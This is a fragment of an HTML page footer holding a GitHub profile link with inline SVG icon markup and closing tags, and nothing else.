</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHubOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>